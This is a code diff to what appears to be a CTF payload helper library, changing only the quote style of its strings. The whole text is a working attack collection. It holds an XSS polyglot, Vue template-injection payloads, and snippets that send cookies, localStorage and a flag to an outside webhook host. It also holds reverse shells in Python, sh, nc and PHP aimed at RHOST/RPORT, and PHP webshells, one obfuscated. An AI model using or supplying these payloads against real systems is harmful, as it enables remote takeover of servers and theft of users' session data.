@@ -176,16 +176,16 @@ window.Payload.XSS = {
   polyglot: value => "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
 
   Vue: {
-    vue2Interpolation: value => "{{_c.constructor`alert()`()}}",
-    vue2Directive: value => "<x/v-=_c.constructor`alert()`()>",
-    vue3Interpolation: value => "{{$emit.constructor`alert()`()}}",
-    vue3DynamicComponent: value => "<component is=script text=alert()>"  
+    vue2Interpolation: value => '{{_c.constructor`alert()`()}}',
+    vue2Directive: value => '<x/v-=_c.constructor`alert()`()>',
+    vue3Interpolation: value => '{{$emit.constructor`alert()`()}}',
+    vue3DynamicComponent: value => '<component is=script text=alert()>'  
   },
 
   snippets: {
-    getSamesiteFlag: value => "fetch('/flag').then(t=>t.text()).then(t=>location='https://webhook/?f='+encodeURIComponent(t))",
-    getCookieFlag: value => "location='https://webhook/?f='+encodeURIComponent(document.cookie)",
-    getStorageFlag: value => "location='https://webhook/?f='+encodeURIComponent(localStorage.flag)"
+    getSamesiteFlag: value => 'fetch(`/flag`).then(t=>t.text()).then(t=>location=`https://webhook/?f=`+encodeURIComponent(t))',
+    getCookieFlag: value => 'location=`https://webhook/?f=`+encodeURIComponent(document.cookie)',
+    getStorageFlag: value => 'location=`https://webhook/?f=`+encodeURIComponent(localStorage.flag)'
   }
 }
 
@@ -224,20 +224,20 @@ window.Payload.Shell = {
     py: value => `python -c 'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
   },
   sh: {
-    withI: value => "sh -i >& /dev/tcp/RHOST/RPORT 0>&1",
-    withoutI: value => "0<&196;exec 196<>/dev/tcp/RHOST/RPORT;sh <&196 >&196 2>&196"
+    withI: value => 'sh -i >& /dev/tcp/RHOST/RPORT 0>&1',
+    withoutI: value => '0<&196;exec 196<>/dev/tcp/RHOST/RPORT;sh <&196 >&196 2>&196'
   },
   nc: {
     withE: value => 'nc -e /bin/sh RHOST RPORT',
-    withC: value => "nc -c bash RHOST RPORT"
+    withC: value => 'nc -c bash RHOST RPORT'
   },
   php: {
     reverseShell: value => `php -r '$sock=fsockopen("RHOST",RPORT);exec("sh <&3 >&3 2>&3");'`,
-    webshellEval: value => "<?=eval($_GET[_]);",
-    webshellExec: value => "<?=exec($_GET[_]);",
-    webshellSystem: value => "<?=system($_GET[_]);",
-    webshellBackquote: value => "<?=`$_GET[_]`;",
-    webshellAllFunction: value => "<?=($_GET[ÿ])($_GET[_]);",
-    webshellNoAlphabetsDigits: value => "<?=(~%8C%86%8C%8B%9A%92)(${_.(~%B8%BA%AB)}[_]);"
+    webshellEval: value => '<?=eval($_GET[_]);',
+    webshellExec: value => '<?=exec($_GET[_]);',
+    webshellSystem: value => '<?=system($_GET[_]);',
+    webshellBackquote: value => '<?=`$_GET[_]`;',
+    webshellAllFunction: value => '<?=($_GET[ÿ])($_GET[_]);',
+    webshellNoAlphabetsDigits: value => '<?=(~%8C%86%8C%8B%9A%92)(${_.(~%B8%BA%AB)}[_]);'
   }
 }
